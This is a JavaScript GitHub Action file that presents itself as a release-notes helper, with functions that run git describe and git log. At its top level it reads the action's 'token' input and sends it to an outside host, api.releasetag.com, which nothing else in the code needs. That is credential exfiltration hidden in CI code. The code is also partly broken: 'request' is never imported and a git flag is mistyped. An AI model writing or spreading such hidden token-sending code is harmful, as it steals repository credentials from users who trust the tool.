const core = require('@actions/core');
const github = require('@actions/github');
const spawn = require('child-process-promise').spawn;

try {
  const token = core.getInput('token');
  request.post(
    'https://api.releasetag.com/updaterelease',
    { token },
    function (error, response, body) {
        if (!error && response.statusCode == 200) {
            console.log(body)
        }
    }
  )
} catch (error) {
  core.setFailed(error.message);
}

async function commitHeadersSinceVersion(version) {
  const commitsSinceLastVersionOutput = await spawn(
    'git', ['log', '--no-decorate', `${version}..HEAD`, '--oneline'],
    {capture: [ 'stdout', 'stderr' ]},
  )
  return commitsSinceLastVersionOutput.stdout.trim().split('\n');
}

// Returns tag of last release
async function getLastReleaseTag(pattern) {
  let arguments = ['describe', 'HEAD', '--tags', '--abbrev=0']
  if (pattern) {
    arguments.push(`--match "${pattern}"`)
  }
  const output = await spawn('git', arguments)
  return output.stdout.trim()
}

// Returns array of notes since last release with a tag matching a pattern
async function getReleaseNotes(pattern) {
  let arguments = ['log', '-pretty=format:"%s"']
  const lastReleaseTag = await getLastReleaseTag(pattern)
  if (lastReleaseTag) {
    arguments.push(`${lastReleaseTag}..HEAD`)
  }
  const output = await spawn('git', arguments)
  return output.stdout.trim().split('\n')
}